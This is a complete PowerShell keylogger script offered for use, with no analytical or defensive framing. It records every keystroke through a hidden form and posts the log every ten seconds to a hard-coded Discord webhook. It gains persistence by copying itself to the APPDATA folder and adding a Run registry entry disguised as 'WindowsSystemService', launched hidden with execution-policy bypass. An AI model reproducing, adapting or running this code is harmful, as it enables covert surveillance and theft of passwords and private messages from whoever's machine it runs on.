$w = "https://discord.com/api/webhooks/1354862304818368753/00a1z0gP218HKXXcp2537RR0A635q3H5K0qIBviITk7XjJHsArVx2CadpC5q3WP1VS1f"
$k = "killme" # Kill word to stop the logger
$p = "$env:APPDATA\s.ps1" # Persistence path
$l = "" # Log buffer
$t = "" # Temporary buffer for kill word detection

# Load required assembly for GUI
Add-Type -AssemblyName System.Windows.Forms

# Create a hidden form to capture keystrokes
$form = New-Object Windows.Forms.Form
$form.KeyPreview = $true
$form.WindowState = 'Minimized'
$form.ShowInTaskbar = $false
$form.ShowIcon = $false

# KeyPress event handler
$form.Add_KeyPress({
    $global:t += $_.KeyChar
    $global:l += $_.KeyChar

    # Check for kill word
    if ($t -like "*$k") {
        $global:l += "`n[Stopped by kill word]`n"
        try { Invoke-RestMethod -Uri $w -Method POST -Body @{ content = $global:l } } catch {}
        try { Remove-Item $p -Force } catch {}
        try { Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSystemService" } catch {}
        $form.Close()
        exit
    }

    # Reset buffer if too large
    if ($t.Length -gt 100) { $t = $t.Substring($t.Length - 10) }
})

# Function to send logs periodically
function Send-Log {
    if ($global:l.Length -gt 0) {
        try { Invoke-RestMethod -Uri $w -Method POST -Body @{ content = $global:l } -ErrorAction SilentlyContinue } catch {}
        $global:l = ""
    }
}

# Timer to send logs every 10 seconds
$timer = New-Object Windows.Forms.Timer
$timer.Interval = 10000
$timer.Add_Tick({ Send-Log })
$timer.Start()

# Persistence: Save script and add to startup
try {
    Set-Content -Path $p -Value $MyInvocation.MyCommand.Definition -Force
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsSystemService /t REG_SZ /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$p`"" /f | Out-Null
} catch {}

# Run the form
[Windows.Forms.Application]::Run($form)